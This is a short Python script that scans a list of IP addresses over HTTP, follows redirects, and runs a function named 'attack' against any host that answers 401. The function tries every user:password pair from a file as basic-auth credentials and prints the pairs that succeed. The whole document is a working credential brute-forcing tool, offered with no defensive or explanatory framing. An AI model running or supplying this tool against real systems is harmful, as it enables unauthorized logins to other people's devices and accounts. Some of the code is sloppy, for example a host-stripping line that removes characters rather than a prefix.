import requests

requests.packages.urllib3.disable_warnings()


def read_file(filename):
	return list(open(filename, 'r'))


def check_status(url):
	try:
		req = requests.head(url, verify=False)
		return req.status_code
	except Exception as e:
		print(e)
		return 0


def check_location(url):
	try:
		req = requests.head(url, verify=False)
		location = req.headers["location"]
		host = url.strip("https:/")
		if host in location:
			return location
		else:
			return url + location

	except Exception as e:
		print(e)
		return " "


def get_body(url):
	r = requests.get(url)
	text = r.text


def analyze(url, auth_list):
	code = check_status(url)

	if code == 200:
		print(int(code/100), end="")

	elif 299 < code < 400:
		print(int(code/100), end="")
		location = check_location(url)
		analyze(location, auth_list)
	elif code == 401:
		print(int(code/100), end="\t")
		attack(url, auth_list)
	else:
		print("OTH", end="")


def attack(url, auth_list):
	for pair in auth_list:
		user, passwd = pair.split(":")
		print("|", end="")
		code = authenticate(url, user, passwd)
		if code == 200:
			print("SUCCESS: ", user, passwd)
		else:
			pass


def authenticate(url, user, passwd):
	req = requests.get(url, auth=(user, passwd))
	return req.status_code


def main():
	ip_file = "ip.list"
	auth_file = "auth.list"
	ip_list = read_file(ip_file)
	auth_list = read_file(auth_file)

	for ip in ip_list:
		if len(ip.strip()) < 15:
			nip = ip.strip()
			for i in range(15-(len(nip))):
				nip += " "
			print("\n", nip, end="\t")
		else:
			print("\n", ip.strip(), end="\t")
		url = "http://" + ip.strip() + "/"
		analyze(url, auth_list)
	print(" ")


if __name__ == "__main__":
	main()